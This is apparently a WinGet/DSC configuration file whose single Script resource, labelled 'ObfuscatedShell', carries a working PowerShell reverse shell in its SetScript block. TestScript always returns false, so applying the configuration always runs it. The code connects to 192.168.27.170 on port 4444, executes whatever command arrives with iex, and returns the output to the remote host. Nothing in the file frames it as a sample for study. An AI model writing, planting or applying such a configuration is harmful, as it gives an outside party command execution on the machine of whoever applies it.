properties:
  configurationVersion: 0.2.0
  resources:
    - resource: PSDscResources/Script
      id: ObfuscatedShell
      directives:
        allowPrerelease: true
      settings:
        GetScript: |
          @{Result="OK"}
        TestScript: |
          return $false
        SetScript: |
          $a="System.Net.Sockets.TcpClient";$b="192.168.27.170";$c=4444
          $d=New-Object $a($b,$c);$e=$d.GetStream()
          $f=0..65535|%{0};$g=$e.Read($f,0,$f.Length)
          $h=(New-Object System.Text.ASCIIEncoding).GetString($f,0,$g)
          $i=iex $h 2>&1 | Out-String
          $j=$i+(pwd).Path+"> "
          $k=[text.encoding]::ASCII.GetBytes($j)
          $e.Write($k,0,$k.Length);$e.Flush()
